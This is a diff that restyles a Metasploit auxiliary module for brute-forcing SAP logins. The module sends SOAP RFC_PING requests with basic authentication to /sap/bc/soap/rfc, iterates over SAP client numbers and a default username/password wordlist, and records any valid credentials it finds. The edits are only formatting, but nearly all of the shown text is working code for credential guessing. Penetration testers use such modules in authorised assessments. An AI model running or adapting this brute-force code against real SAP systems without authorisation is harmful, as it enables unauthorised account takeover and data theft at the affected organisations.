@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -17,7 +18,6 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -26,10 +26,10 @@ class MetasploitModule < Msf::Auxiliary
   def initialize
     super(
       'Name' => 'SAP SOAP Service RFC_PING Login Brute Forcer',
-      'Description' => %q{
+      'Description' => %q(
         This module attempts to brute force SAP username and passwords through the
         /sap/bc/soap/rfc SOAP service, using RFC_PING function.
-      },
+      ),
       'References' =>
         [
           [ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ]
@@ -47,8 +47,9 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('CLIENT', [true, 'Client can be single (066), comma seperated list (000,001,066) or range (000-999)', '000,001,066']),
         OptString.new('TARGETURI', [true, 'The base path to the SOAP RFC Service', '/sap/bc/soap/rfc']),
         OptPath.new('USERPASS_FILE', [ false, "File containing users and passwords separated by space, one pair per line",
-          File.join(Msf::Config.data_directory, "wordlists", "sap_default.txt") ])
-      ], self.class)
+                                       File.join(Msf::Config.data_directory, "wordlists", "sap_default.txt") ])
+      ], self.class
+    )
 
     deregister_options('HttpUsername', 'HttpPassword')
   end
@@ -82,7 +83,8 @@ class MetasploitModule < Msf::Auxiliary
           "client",
           "user",
           "pass"
-        ])
+        ]
+    )
 
     client_list.each do |c|
       print_status("#{peer} [SAP] Trying client: #{c}")
@@ -98,9 +100,7 @@ class MetasploitModule < Msf::Auxiliary
       end
     end
 
-    if saptbl.rows.count > 0
-      print_line saptbl.to_s
-    end
+    print_line saptbl.to_s if saptbl.rows.count > 0
   end
 
   def report_cred(opts)
@@ -130,7 +130,7 @@ class MetasploitModule < Msf::Auxiliary
     create_credential_login(login_data)
   end
 
-  def bruteforce(username,password,client)
+  def bruteforce(username, password, client)
     uri = normalize_uri(target_uri.path)
 
     data = '<?xml version="1.0" encoding="utf-8" ?>'
@@ -141,23 +141,21 @@ class MetasploitModule < Msf::Auxiliary
     data << '</env:Body>'
     data << '</env:Envelope>'
 
-    res = send_request_cgi({
-      'uri' => uri,
-      'method' => 'POST',
-      'vars_get' => {
-        'sap-client' => client,
-        'sap-language' => 'EN'
-      },
-      'data' => data,
-      'cookie' => "sap-usercontext=sap-language=EN&sap-client=#{client}",
-      'ctype' => 'text/xml; charset=UTF-8',
-      'authorization' => basic_auth(username, password),
-      'encode_params' => false,
-      'headers' =>
+    res = send_request_cgi('uri' => uri,
+                           'method' => 'POST',
+                           'vars_get' => {
+                             'sap-client' => client,
+                             'sap-language' => 'EN'
+                           },
+                           'data' => data,
+                           'cookie' => "sap-usercontext=sap-language=EN&sap-client=#{client}",
+                           'ctype' => 'text/xml; charset=UTF-8',
+                           'authorization' => basic_auth(username, password),
+                           'encode_params' => false,
+                           'headers' =>
         {
-          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
-        }
-    })
+          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions'
+        })
 
     if res && res.code == 200 && res.body.include?('RFC_PING')
       print_good("#{peer} [SAP] Client #{client}, valid credentials #{username}:#{password}")
@@ -175,4 +173,3 @@ class MetasploitModule < Msf::Auxiliary
     false
   end
 end
-
